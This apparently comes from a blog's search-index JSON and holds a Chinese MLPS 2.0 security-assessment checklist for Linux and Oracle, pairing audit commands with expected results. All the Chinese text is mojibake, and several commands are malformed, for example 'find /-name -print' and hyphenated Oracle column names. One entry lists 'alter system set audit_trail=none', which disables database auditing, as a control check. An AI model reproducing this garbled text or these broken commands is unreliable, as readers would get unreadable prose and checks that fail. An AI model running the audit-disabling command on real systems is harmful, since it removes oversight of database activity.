today\næŸ¥çœ‹ä»Šå¤©ä»¥åçš„æ—¥å¿—\nå®¡è®¡è®°å½•åŒ…æ‹¬äº‹ä»¶çš„æ—¥æœŸã€æ—¶é—´ã€ç±»å‹ã€ä¸»ä½“æ ‡è¯†ã€å®¢ä½“æ ‡è¯†å’Œç»“æœ\n\n\ntail -20 /var/log/audit/audit.log\næŸ¥çœ‹å®¡è®¡æ—¥å¿—\nå®¡è®¡è®°å½•åŒ…æ‹¬äº‹ä»¶çš„æ—¥æœŸã€æ—¶é—´ã€ç±»å‹ã€ä¸»ä½“æ ‡è¯†ã€å®¢ä½“æ ‡è¯†å’Œç»“æœ\n\n\naucat &#124; tail -x\næŸ¥çœ‹æœ€è¿‘çš„xæ¡å®¡è®¡è®°å½•\n\n\n\naugrep -e TEXT -U AUTH-success\næŸ¥çœ‹æ‰€æœ‰æˆåŠŸçš„PAMæˆæƒ\n\n\n\n3.3 åº”å¯¹å®¡è®¡è®°å½•è¿›è¡Œä¿æŠ¤ï¼Œå®šæœŸå¤‡ä»½ï¼Œé¿å…å—åˆ°æœªé¢„æœŸçš„åˆ é™¤ã€ä¿®æ”¹æˆ–è¦†ç›–ç­‰ã€‚3.4 åº”å¯¹å®¡è®¡è¿›ç¨‹è¿›è¡Œä¿æŠ¤ï¼Œé˜²æ­¢æœªç»æˆæƒçš„ä¸­æ–­ã€‚  \n\n4.å…¥ä¾µé˜²èŒƒ\n4.1 åº”éµå¾ªæœ€å°å®‰è£…çš„åŸåˆ™ï¼Œä»…å®‰è£…éœ€è¦çš„ç»„ä»¶å’Œåº”ç”¨ç¨‹åºã€‚   \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nyum list installed\næŸ¥çœ‹å·²å®‰è£…çš„ç¨‹åºåŒ…\nå…¶ä¸­åº”æ— å½“å‰ä¸éœ€è¦ä½¿ç”¨çš„ç»„ä»¶å’Œåº”ç”¨ç¨‹åº\n\n\n\n4.2 åº”å…³é—­ä¸éœ€è¦çš„ç³»ç»ŸæœåŠ¡ã€é»˜è®¤å…±äº«å’Œé«˜å±ç«¯å£ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nservice â€“status-all &#124; grep running\næŸ¥çœ‹å¤šä½™çš„ç½‘ç»œæœåŠ¡æ˜¯å¦å…³é—­\nåº”å…³é—­\n\n\nnetstat -ntlp\næŸ¥çœ‹æ˜¯å¦å…³é—­éå¿…é¡»çš„ç«¯å£\nåº”å…³é—­\n\n\n\n4.3 åº”é€šè¿‡è®¾å®šç»ˆç«¯æ¥å…¥æ–¹å¼æˆ–ç½‘ç»œåœ°å€èŒƒå›´å¯¹é€šè¿‡ç½‘ç»œè¿›è¡Œç®¡ç†çš„ç®¡ç†ç»ˆç«¯è¿›è¡Œé™åˆ¶ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\n/etc/hosts.deny\nè®¿é—®æœ¬æœºipé»‘åå•\nåº”æœ‰â€ALL:ALLâ€\n\n\n/etc/hosts.allow\nè®¿é—®æœ¬æœºipç™½åå•\nåº”æœ‰â€sshd:192.168.xxx.xxx/255.255.255.0â€\n\n\n\n4.4 åº”èƒ½å‘ç°å¯èƒ½å­˜åœ¨çš„å·²çŸ¥æ¼æ´ï¼Œå¹¶åœ¨ç»è¿‡å……åˆ†æµ‹è¯•è¯„ä¼°åï¼ŒåŠæ—¶ä¿®è¡¥æ¼æ´ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nrpm -qa &#124; grep patch\næŸ¥çœ‹è¡¥ä¸å®‰è£…æƒ…å†µ\nè¡¥ä¸æ›´æ–°æ—¶é—´ä¸ºæœ€è¿‘ã€‚å·²å¯¹è¡¥ä¸è¿›è¡Œæ§åˆ¶å’Œç®¡ç†ã€‚\n\n\n\n4.5 åº”èƒ½å¤Ÿæ£€æµ‹åˆ°å¯¹é‡è¦èŠ‚ç‚¹è¿›è¡Œå…¥ä¾µçš„è¡Œä¸ºï¼Œå¹¶åœ¨å‘ç”Ÿä¸¥é‡å…¥ä¾µäº‹ä»¶æ—¶æä¾›æŠ¥è­¦ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nfind /-name -print\næŸ¥çœ‹æ˜¯å¦å®‰è£…äº†ä¸»æœºå…¥ä¾µæ£€æµ‹è½¯ä»¶\nåº”æœ‰å®‰è£…\n\n\n\n\n5.æ¶æ„ä»£ç é˜²èŒƒ\n5.1 åº”é‡‡ç”¨å…å—æ¶æ„ä»£ç æ”»å‡»çš„æŠ€æœ¯æªæ–½æˆ–ä¸»åŠ¨å…ç–«å¯ä¿¡éªŒè¯æœºåˆ¶åŠæ—¶è¯†åˆ«å…¥ä¾µå’Œç—…æ¯’è¡Œä¸ºï¼Œå¹¶å°†å…¶æœ‰æ•ˆé˜»æ–­ã€‚  \n\n6.å¯ä¿¡éªŒè¯\n6.1 å¯åŸºäºå¯ä¿¡æ ¹å¯¹é€šä¿¡è®¾å¤‡çš„ç³»ç»Ÿå¼•å¯¼ç¨‹åºã€ç³»ç»Ÿç¨‹åºã€é‡è¦é…ç½®å‚æ•°å’Œåº”ç”¨ç¨‹åºç­‰è¿›è¡Œå¯ä¿¡éªŒè¯ï¼Œå¹¶åœ¨åº”ç”¨ç¨‹åºçš„å…³é”®æ‰§è¡Œç¯èŠ‚è¿›è¡ŒåŠ¨æ€å¯ä¿¡éªŒè¯ï¼Œåœ¨æ£€æµ‹åˆ°å…¶å¯ä¿¡æ€§å—åˆ°ç ´ååè¿›è¡ŒæŠ¥è­¦ï¼Œå¹¶å°†éªŒè¯ç»“æœå½¢æˆå®¡è®¡è®°å½•é€è‡³å®‰å…¨ç®¡ç†ä¸­å¿ƒã€‚  \n\næ•°æ®åº“Oracle1.èº«ä»½é‰´åˆ«\n1.1 åº”å¯¹ç™»å½•çš„ç”¨æˆ·è¿›è¡Œèº«ä»½æ ‡è¯†å’Œé‰´åˆ«ï¼Œèº«ä»½æ ‡è¯†å…·æœ‰å”¯ä¸€æ€§ï¼Œèº«ä»½é‰´åˆ«ä¿¡æ¯å…·æœ‰å¤æ‚åº¦è¦æ±‚å¹¶å®šæœŸæ›´æ¢ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nselect limit from dba_profiles where profile=â€™DEFAULTâ€™ and resource_name=â€™PASSWORD_VERIFY_FUNCTIONâ€™\nå£ä»¤å¤æ‚åº¦å‡½æ•°\nä¸ä¸ºUNLIMITED\n\n\nutlpwdmg.sqlæ–‡ä»¶çš„â€™â€“Check for the minimum length of the passwordâ€™éƒ¨åˆ†\nå£ä»¤æœ€å°é•¿åº¦è§„åˆ™\nâ€˜length(password)&lt;â€™åçš„å€¼â‰¥8\n\n\nselect limit from dba_profiles where profile=â€™DEFAULTâ€™ and resource_name=â€™PASSWORD_LIFE_TIMEâ€\nå£ä»¤è¿‡æœŸæ—¶é™\nä¸ä¸ºUNLIMITED\n\n\n\n1.2 åº”å…·æœ‰ç™»å½•å¤±è´¥å¤„ç†åŠŸèƒ½ï¼Œåº”é…ç½®å¹¶å¯ç”¨ç»“æŸä¼šè¯ã€é™åˆ¶éæ³•ç™»å½•æ¬¡æ•°å’Œå½“ç™»å½•è¿æ¥è¶…æ—¶è‡ªåŠ¨é€€å‡ºç­‰ç›¸å…³æªæ–½ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nselect limit from dba_profiles where profile=â€™DEFAULTâ€™ and resource_name=â€™FAILED_LOGIN_ATTEMPTSâ€™\nç™»é™†å¤±è´¥æ¬¡æ•°\nä¸ä¸ºUNLIMITED\n\n\nselect limit from dba_profiles where profile=â€™DEFAULTâ€™ and resource_name=â€™PASSWORD_LOCK_TIMEâ€™\nç™»é™†å¤±è´¥é”å®šæ—¶é•¿\nä¸ä¸ºUNLIMITED\n\n\nselect limit from dba_profiles where profile=â€™DEFAULTâ€™ and resource_name=â€™IDLE_TIMEâ€™\nç™»é™†è¶…æ—¶é€€å‡ºæ—¶é•¿\nä¸ä¸ºUNLIMITED\n\n\nselect limit from dba_profiles where profile=â€™DEFAULTâ€™ and resource-name=â€™CPU-PER-SESSIONâ€™\nä¸€ä¸ªä¼šè¯å¯ä»¥ä½¿ç”¨çš„CPUæ—¶é—´\nä¸ä¸ºUNLIMITED\n\n\nselect limit from dba-profiles where profile=â€™DEFAULTâ€™ and resource-name=â€™SESSION-PER-USERSâ€™\næ¯ä¸ªç”¨æˆ·æ‰€å…è®¸çš„å¹¶è¡Œä¼šè¯æ•°\nä¸ä¸ºUNLIMITED\n\n\n\n1.3 ï¼ˆé»˜è®¤ç¬¦åˆï¼‰å½“è¿›è¡Œè¿œç¨‹ç®¡ç†æ—¶ï¼Œåº”é‡‡å–å¿…è¦çš„æªæ–½é˜²æ­¢é‰´åˆ«ä¿¡æ¯åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­è¢«çªƒå¬ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\næ‰§è¡Œlsnrctl status &lt;ç›‘å¬å™¨å&gt; æˆ– æŸ¥çœ‹æ–‡ä»¶$ORACLE_HOME/network/admin/listener.oraä¸­LISTERENRçš„PROTOCALå’ŒPORT\næœåŠ¡ç«¯Oracleç›‘å¬å™¨ç›‘å¬çš„ç½‘ç»œåè®®ï¼Œåº”å¯ç”¨SSLåŠ å¯†\nprotocol(TCPS);port(2484)\n\n\næŸ¥çœ‹æ–‡ä»¶$ORACLE_HOME/network/admin/tnsnames.oraä¸­LISTERENRçš„PROTOCALå’ŒPORT\nå®¢æˆ·ç«¯åº”å¯ç”¨SSLåŠ å¯†\nprotocol(TCPS);port(2484)\n\n\næŸ¥çœ‹æ–‡ä»¶$ORACLE_HOME/network/admin/sqlnet.oraä¸­WALLET_LOCATIONã€SQLNET.AUTHENTICATION_SERVERSã€SSLçš„ç›¸å…³é…ç½®\næœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶\nåº”æœ‰SSLçš„ç›¸å…³é…ç½®\n\n\næŸ¥çœ‹æ–‡ä»¶$ORACLE_HOME/network/admin/sqlnet.oraä¸­SQLNET.ENCRYPTION_SERVER;SQLNET.ENCRYPTION_TYPES_SERVERã€‚SQLNET.CRYPTO_CHECKSUM_SERVER;SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER\nSQLNET.ENCRYPTION_SERVERâ€“requiredï¼›SQLNET.ENCRYPTION_TYPES_SERVERâ€“æ­¤å¤„æŒ‡å®šçš„åŠ å¯†ç®—æ³•åº”ä¸ä¸ºå·²è¢«è¯æ˜ä¸å®‰å…¨çš„ç®—æ³•ï¼Œå¦‚DESã€3DESã€‚  SQLNET.CRYPTO_CHECKSUM_SERVERâ€“requiredï¼›SQLNET.CRYPTO_CHECKSUM_TYPES_SERVERâ€“æ­¤å¤„æŒ‡å®šçš„åŠ å¯†ç®—æ³•åº”ä¸ä¸ºå·²è¢«è¯æ˜ä¸å®‰å…¨çš„ç®—æ³•ï¼Œå¦‚DESã€3DESã€‚\n\n\n\n1.4 åŒå› å­è®¤è¯ã€‚  \n\n2.è®¿é—®æ§åˆ¶\n2.1 åº”å¯¹ç™»å½•çš„ç”¨æˆ·åˆ†é…è´¦æˆ·å’Œæƒé™ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nselect username,account_status from dba_users\ndba_usersè´¦æˆ·çŠ¶æ€\nè¶…çº§ç®¡ç†å‘˜SYSã€æ™®é€šç®¡ç†å‘˜SYSTEMã€OEMå·¥å…·é›†ç›¸å…³ç®¡ç†ç”¨æˆ·DBSNMPã€SYSMANã€MGMT_VIEWå‡ä¸ºå¯ç”¨çŠ¶æ€ï¼Œå…¶ä»–å‡ä¸ºé”å®šçŠ¶æ€\n\n\n\n2.2 åº”é‡å‘½åæˆ–åˆ é™¤é»˜è®¤è´¦æˆ·ï¼Œä¿®æ”¹é»˜è®¤è´¦æˆ·çš„é»˜è®¤å£ä»¤ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nselect * from dba_users\ndba_usersç­–ç•¥\nSYSå£ä»¤åº”ä¸ä¸ºCHANGE_ON_INSTALL;SYSTEMå£ä»¤åº”ä¸ä¸ºMANAGER;DBSNMPå£ä»¤åº”ä¸ä¸ºDBSNMP\n\n\n\n2.3 åº”åŠæ—¶åˆ é™¤æˆ–åœç”¨å¤šä½™çš„ã€è¿‡æœŸçš„è´¦æˆ·ï¼Œé¿å…å…±äº«è´¦æˆ·çš„å­˜åœ¨ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nselect username,account_status from dba_users\ndba_usersç­–ç•¥\nè¿”å›ç»“æœåº”ä¸å­˜åœ¨èŒƒä¾‹è´¦å·scottã€outlnã€ordsys,è¿‡æœŸè´¦æˆ·account_status=expired,è¿”å›ç»“æœåº”ä¸€ä¸€å¯¹åº”\n\n\n\n2.4 åº”æˆäºˆç®¡ç†ç”¨æˆ·æ‰€éœ€çš„æœ€å°æƒé™ï¼Œå®ç°ç®¡ç†ç”¨æˆ·çš„æƒé™åˆ†ç¦»ã€‚2.5 ï¼ˆG3ï¼‰åº”ç”±æˆæƒä¸»é¢˜é…ç½®è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œè®¿é—®æ§åˆ¶ç­–ç•¥è§„å®šä¸»ä½“å¯¹å®¢ä½“çš„è®¿é—®æ§åˆ¶è§„åˆ™ã€‚2.6 ï¼ˆG3ï¼‰è®¿é—®æ§åˆ¶çš„ç²’åº¦åº”è¾¾åˆ°ä¸»ä½“ä¸ºç”¨æˆ·çº§æˆ–è¿›ç¨‹çº§ï¼Œå®¢ä½“ä¸ºæ–‡ä»¶ã€æ•°æ®åº“è¡¨çº§ã€‚2.7 ï¼ˆG3ï¼‰åº”å¯¹é‡è¦ä¸»ä½“å’Œå®¢ä½“è®¾ç½®å®‰å…¨æ ‡è®°ï¼Œå¹¶æ§åˆ¶ä¸»ä½“å¯¹æœ‰å®‰å…¨æ ‡è®°ä¿¡æ¯èµ„æºçš„è®¿é—®ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nselect username from dba_users\ndba_usersç­–ç•¥\nåº”å®‰è£…Oracle Label Securityæ¨¡å—ï¼šè¿”å›ç”¨æˆ·ä¸­å­˜åœ¨LBACSYS\n\n\nselect policy_name,status from DBA_SA_POLICIES\nç­–ç•¥åˆ›å»ºæƒ…å†µ\nå­˜åœ¨status=enableçš„æ ‡ç­¾ç­–ç•¥\n\n\nselect * from dba_sa_levels ORDER BY level_num\nçº§åˆ«åˆ›å»ºæƒ…å†µ\næŸ¥è¯¢ç»“æœä¸ä¸ºç©º\n\n\nselect * from dba_sa_labels\næ ‡ç­¾åˆ›å»ºæƒ…å†µ\næŸ¥è¯¢ç»“æœä¸ä¸ºç©º\n\n\nselect * from dba_sa_tables_policies\näº†è§£ç”¨äºå­˜å‚¨é‡è¦æ•°æ®çš„è¡¨çš„åç§°\næŸ¥è¯¢ç»“æœä¸ä¸ºç©ºï¼Œä¸”åŒ…å«é‡è¦æ•°æ®æ‰€åœ¨è¡¨çš„åç§°\n\n\n\n\n3.å®‰å…¨å®¡è®¡\n3.1 åº”å¯ç”¨å®‰å…¨å®¡è®¡åŠŸèƒ½ï¼Œå®¡è®¡è¦†ç›–åˆ°æ¯ä¸ªç”¨æˆ·ï¼Œå¯¹é‡è¦ç”¨æˆ·è¡Œä¸ºå’Œé‡è¦å®‰å…¨äº‹ä»¶è¿›è¡Œå®¡è®¡ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nshow parameter audit\næŸ¥çœ‹æ˜¯å¦å¼€å¯å®¡è®¡åŠŸèƒ½\naudit_sys_operations=TRUEï¼›audit_trail ä¸ä¸º none\n\n\n\n3.2 å®¡è®¡è®°å½•åº”åŒ…æ‹¬äº‹ä»¶çš„æ—¥æœŸå’Œæ—¶é—´ã€ç”¨æˆ·ã€äº‹ä»¶ç±»å‹ã€äº‹ä»¶æ˜¯å¦æˆåŠŸåŠå…¶ä»–ä¸å®¡è®¡ç›¸å…³çš„ä¿¡æ¯ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nSQL&gt;show parameter background_dump_dest\næŸ¥è¯¢æ—¥å¿—æ–‡ä»¶ä½ç½®\nï¼ˆé»˜è®¤ï¼‰$ORACLE/rdbms/log\n\n\nSQL&gt;select log_mode,force_logging from v$database;\næŸ¥è¯¢æ•°æ®åº“çš„æ—¥å¿—è®°å½•æ¨¡å¼\nä¸å…¨ä¸ºNOï¼Œå­˜åœ¨è®°å½•æŸä¸€çº§åˆ«çš„æ—¥å¿—\n\n\nSQL&gt;select tablespace_name,logging,force_logging from db_tablespaces;\næŸ¥è¯¢è¡¨ç©ºé—´çš„æ—¥å¿—è®°å½•æ¨¡å¼\nä¸å…¨ä¸ºNOï¼Œå­˜åœ¨è®°å½•æŸä¸€çº§åˆ«çš„æ—¥å¿—\n\n\nSQL&gt;select table_name,logging from user_tables;\næŸ¥è¯¢å¯¹è±¡çš„æ—¥å¿—è®°å½•æ¨¡å¼\nä¸å…¨ä¸ºNOï¼Œå­˜åœ¨è®°å½•æŸä¸€çº§åˆ«çš„æ—¥å¿—\n\n\n\n3.3 åº”å¯¹å®¡è®¡è®°å½•è¿›è¡Œä¿æŠ¤ï¼Œå®šæœŸå¤‡ä»½ï¼Œé¿å…å—åˆ°æœªé¢„æœŸçš„åˆ é™¤ã€ä¿®æ”¹æˆ–è¦†ç›–ç­‰ã€‚3.4 åº”å¯¹å®¡è®¡è¿›ç¨‹è¿›è¡Œä¿æŠ¤ï¼Œé˜²æ­¢æœªç»æˆæƒçš„ä¸­æ–­ã€‚  \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nalter system set audit_trail=none\nå…³é—­å®¡è®¡è¿›ç¨‹\né™¤å®¡è®¡äººå‘˜å¤–ï¼Œå…¶ä»–äººæ— æ³•å¯¹å®¡è®¡è¿›ç¨‹è¿›è¡Œå¼€å¯å…³é—­\n\n\n\n\n4.å…¥ä¾µé˜²èŒƒ\nï¼ˆä»¥å®é™…æƒ…å†µä¸ºå‡†ï¼‰4.1 åº”éµå¾ªæœ€å°å®‰è£…çš„åŸåˆ™ï¼Œä»…å®‰è£…éœ€è¦çš„ç»„ä»¶å’Œåº”ç”¨ç¨‹åºã€‚ï¼ˆä¸é€‚ç”¨ï¼‰4.2 åº”å…³é—­ä¸éœ€è¦çš„ç³»ç»ŸæœåŠ¡ã€é»˜è®¤å…±äº«å’Œé«˜å±ç«¯å£ã€‚4.3 åº”é€šè¿‡è®¾å®šç»ˆç«¯æ¥å…¥æ–¹å¼æˆ–ç½‘ç»œåœ°å€èŒƒå›´å¯¹é€šè¿‡ç½‘ç»œè¿›è¡Œç®¡ç†çš„ç®¡ç†ç»ˆç«¯è¿›è¡Œé™åˆ¶ã€‚   \n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\næŸ¥çœ‹sqlnet.oraæ–‡ä»¶ä¸­tcp.validnode_checkingå’Œtcp.invited_nodes\nå¯ç”¨ç›¸åº”é…ç½®\ntcp.validnode_checking=yesï¼›tcp.invited_nodeså‚æ•°å·²é…ç½®IPåœ°å€åˆ—è¡¨\n\n\n\nï¼ˆä¸é€‚ç”¨ï¼‰4.4 åº”æä¾›æ•°æ®æœ‰æ•ˆæ€§æ ¡éªŒåŠŸèƒ½ï¼Œä¿è¯é€šè¿‡äººæœºæ¥å£è¾“å…¥æˆ–é€šè¿‡é€šä¿¡æ¥å£è¾“å…¥çš„å†…å®¹ç¬¦åˆç³»ç»Ÿè®¾å®šè¦æ±‚ã€‚ï¼ˆä¾æ®æ¼æ‰«ç»“æœï¼‰4.5 åº”èƒ½å‘ç°å¯èƒ½å­˜åœ¨çš„å·²çŸ¥æ¼æ´ï¼Œå¹¶åœ¨ç»è¿‡å……åˆ†æµ‹è¯•è¯„ä¼°åï¼ŒåŠæ—¶ä¿®è¡¥æ¼æ´ã€‚\n\n\n\nå‘½ä»¤\næ³¨é‡Š\né¢„æœŸ\n\n\n\n\nâ€“cd $ORACLE_HOME/Opatch opatch lsinventory\näº†è§£Oracleæ•°æ®åº“çš„è¡¥ä¸å‡çº§æœºåˆ¶\nOPatchå’ŒOUIçš„ç‰ˆæœ¬è¾ƒæ–°\n\n\n\nï¼ˆä¸é€‚ç”¨ï¼‰4.6 åº”èƒ½å¤Ÿæ£€æµ‹åˆ°å¯¹é‡è¦èŠ‚ç‚¹è¿›è¡Œå…¥ä¾µçš„è¡Œä¸ºï¼Œå¹¶åœ¨å‘ç”Ÿä¸¥é‡å…¥ä¾µäº‹ä»¶æ—¶æä¾›æŠ¥è­¦ã€‚  \n\n","categories":["ç­‰ä¿æµ‹è¯„/åˆçº§è€ƒè¯•"],"tags":[]},{"title":"æ¦‚å¿µé¢˜ç›®","url":"/be97aa85.html","content":"ç­‰ä¿2.0ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤å®šä¹‰ï¼šå¯¹ç½‘ç»œï¼ˆå«ä¿¡æ¯ç³»ç»Ÿã€æ•°æ®ç­‰ï¼‰å®æ–½åˆ†ç­‰çº§ä¿æŠ¤ï¼Œåˆ†ç­‰çº§ç›‘ç®¡ï¼›ç½‘ç»œä¸­ä½¿ç”¨çš„ç½‘ç»œå®‰å…¨äº§å“åˆ†ç­‰çº§ç®¡ç†ï¼›ç½‘ç»œä¸­å‘ç”Ÿçš„å®‰å…¨äº‹ä»¶åˆ†ç­‰çº§å“åº”ã€å¤„ç½®ã€‚ç­‰ä¿2.0é‡ç‚¹å¼ºè°ƒçš„å…³é”®æŠ€æœ¯åŒ…æ‹¬ï¼šå¯ä¿¡è®¡ç®—æŠ€æœ¯ã€å¼ºåˆ¶è®¿é—®æ§åˆ¶ã€å®¡è®¡è¿½æŸ¥æŠ€æœ¯ã€ç»“æ„åŒ–ä¿æŠ¤æŠ€æœ¯ã€å¤šçº§äº’è”æŠ€æœ¯ç­‰ä¿2.0çš„ä¸€ä¸ªä¸­å¿ƒï¼Œä¸‰é‡é˜²æŠ¤ï¼Œåˆ†åˆ«æŒ‡çš„æ˜¯ä»€ä¹ˆï¼šâ€œä¸€ä¸ªä¸­å¿ƒâ€æŒ‡â€œå®‰å…¨ç®¡ç†ä¸­å¿ƒâ€ï¼›â€œä¸‰é‡é˜²æŠ¤â€æŒ‡â€œå®‰å…¨è®¡ç®—ç¯å¢ƒâ€â€œå®‰å…¨åŒºåŸŸè¾¹ç•Œâ€â€œå®‰å…¨é€šä¿¡ç½‘ç»œâ€ã€‚ç­‰ä¿2.0å»ºè®¾æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š1ï¼‰ä»¥å¯ä¿¡è®¤è¯ä¸ºåŸºç¡€ï¼Œæ„å»ºä¸€ä¸ªå¯ä¿¡çš„ä¸šåŠ¡ç³»ç»Ÿæ‰§è¡Œç¯å¢ƒã€‚2ï¼‰ä»¥è®¿é—®æ§åˆ¶æŠ€æœ¯ä¸ºæ ¸å¿ƒï¼Œå®ç°ä¸»ä½“å¯¹å®¢ä½“çš„å—æ§è®¿é—®ã€‚3ï¼‰æ„å»ºé›†ä¸­ç®¡æ§ã€æœ€å°æƒé™ç®¡ç†ä¸ä¸‰æƒåˆ†ç«‹çš„ç®¡ç†å¹³å°ã€‚ç­‰çº§ä¿æŠ¤å·¥ä½œæœ‰å‡ é¡¹è§„å®šåŠ¨ä½œï¼š5é¡¹ï¼šå®šçº§-å¤‡æ¡ˆ-å»ºè®¾æ•´æ”¹-ç­‰çº§æµ‹è¯„-ç›‘ç£æ£€æŸ¥ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤çš„é¦–è¦ç¯èŠ‚æ˜¯ï¼šå®šçº§/å¤‡æ¡ˆä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤çš„å…³é”®æ˜¯ï¼šå»ºè®¾æ•´æ”¹ä½¿ä¿¡æ¯ç³»ç»Ÿä¿æŠ¤èƒ½åŠ›ä¸æ–­æé«˜çš„ä¿éšœæ˜¯ï¼šç›‘ç£æ£€æŸ¥ç¬¬å‡ çº§å¼€å§‹å¢åŠ  â€œæŠ—æŠµèµ–æ€§â€çš„è¦æ±‚ï¼šç¬¬ä¸‰çº§ç­‰ä¿æµ‹è¯„å¸¸ç”¨æ–¹æ³•æŸ¥çœ‹é…ç½®ï¼šç™»å½•å®‰å…¨è®¾å¤‡ã€ç½‘ç»œè®¾å¤‡ã€ä¸»æœºã€æ•°æ®åº“ã€åº”ç”¨ç³»ç»Ÿç­‰æŸ¥çœ‹è®¾å¤‡æˆ–åº”ç”¨è‡ªèº«çš„é…ç½®æ–‡ä»¶æˆ–è€…è®¾ç½®ã€‚ç­‰ä¿æµ‹è¯„å¸¸ç”¨æ–¹æ³•è°ƒç ”è®¿è°ˆï¼šä¸šåŠ¡è®¿è°ˆã€èµ„äº§è®¿è°ˆã€å®‰å…¨æŠ€æœ¯è®¿è°ˆã€å®‰å…¨ç®¡ç†è®¿è°ˆç­‰ä¿æµ‹è¯„å¸¸ç”¨æ–¹æ³•æŸ¥çœ‹èµ„æ–™ï¼šç®¡ç†åˆ¶åº¦çš„è¯¦ç»†åˆ†æå’Œå¯¹æ ‡åˆ†æï¼›ç®¡ç†ç­–ç•¥çš„è¯¦ç»†åˆ†æå’Œå¯¹æ ‡åˆ†ææµ‹è¯„å¯¹è±¡é€‰æ‹©äº”å¤§åŸåˆ™ï¼šé‡è¦æ€§ã€ä»£è¡¨æ€§ã€å®Œæ•´æ€§ã€å®‰å…¨æ€§ã€å…±äº«æ€§  \nå®šçº§å¤‡æ¡ˆå®šçº§å·¥ä½œæµç¨‹ä¸€èˆ¬æœ‰å‡ é¡¹ï¼š5é¡¹ï¼šç¡®å®šå®šçº§å¯¹è±¡-åˆæ­¥ç¡®å®šç­‰çº§-ä¸“å®¶è¯„å®¡-ä¸»ç®¡éƒ¨é—¨å®¡æ ¸-å¤‡æ¡ˆå®¡æ ¸å®šçº§è¿‡ç¨‹ä¸­ï¼Œåˆæ­¥ç¡®å®šç­‰çº§ä¸ºå“ªä¸€çº§å¯è‡ªè¡Œç¡®å®šæœ€ç»ˆä¿æŠ¤ç­‰çº§ï¼šç¬¬ä¸€çº§ç½‘ç»œè¿è¥è€…åº”å½“åœ¨å“ªä¸ªé˜¶æ®µç¡®å®šç½‘ç»œçš„å®‰å…¨ä¿æŠ¤ç­‰çº§ï¼šè§„åˆ’è®¾è®¡é˜¶æ®µï¼ŒæŒ‰ç…§ä¿¡æ¯ç³»ç»Ÿç­‰çº§ï¼ŒåŒæ­¥è§„åˆ’ã€åŒæ­¥è®¾è®¡ã€åŒæ­¥å®æ–½å®‰å…¨ä¿æŠ¤æŠ€æœ¯æªæ–½å’Œç®¡ç†æªæ–½ã€‚ç¬¬äºŒçº§åŠä»¥ä¸Šçš„ç³»ç»Ÿï¼Œç½‘ç»œè¿è¥è€…åº”å½“åœ¨ç½‘ç»œçš„å®‰å…¨ä¿æŠ¤ç­‰çº§ç¡®å®šå10ä¸ªå·¥ä½œæ—¥å†…ï¼Œåˆ°å¿çº§ä»¥ä¸Šå…¬å®‰æœºå…³æŠ¥å¤‡ã€‚å®šçº§å¯¹è±¡å®šä¹‰ä¸ºï¼šç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å·¥ä½œç›´æ¥ä½œç”¨çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬ä¿¡æ¯ç³»ç»Ÿã€é€šä¿¡ç½‘ç»œè®¾æ–½å’Œæ•°æ®èµ„æºã€‚ä½œä¸ºå®šçº§å¯¹è±¡çš„ä¿¡æ¯ç³»ç»Ÿåº”å…·æœ‰ä¸‰ä¸ªç‰¹å¾ï¼šå…·æœ‰ç¡®å®šçš„ä¸»è¦å®‰å…¨è´£ä»»ä¸»ä½“ã€æ‰¿è½½ç›¸å¯¹ç‹¬ç«‹çš„ä¸šåŠ¡åº”ç”¨ã€åŒ…å«ç›¸äº’å…³è”çš„å¤šä¸ªèµ„æºå®šçº§è¦ç´ ï¼šå—ä¾µå®³å®¢ä½“ã€å¯¹å®¢ä½“çš„ä¾µå®³ç¨‹åº¦S(security)-ä¸šåŠ¡ä¿¡æ¯å®‰å…¨ã€‚ï¼ˆå¤„ç†ä¿¡æ¯ï¼‰ä¿æŠ¤æ•°æ®åœ¨å­˜å‚¨ã€ä¼ è¾“ã€å¤„ç†è¿‡ç¨‹ä¸­ä¸è¢«æ³„éœ²ã€ç ´åå’Œå…å—æœªæˆæƒçš„ä¿®æ”¹çš„ä¿¡æ¯å®‰å…¨ç±»è¦æ±‚ã€‚A(avaliable)-ç³»ç»ŸæœåŠ¡å®‰å…¨ã€‚ï¼ˆæä¾›æœåŠ¡ï¼‰ä¿æŠ¤ç³»ç»Ÿè¿ç»­æ­£å¸¸è¿è¡Œï¼Œå…å—å¯¹ç³»ç»Ÿçš„æœªæˆæƒä¿®æ”¹ã€ç 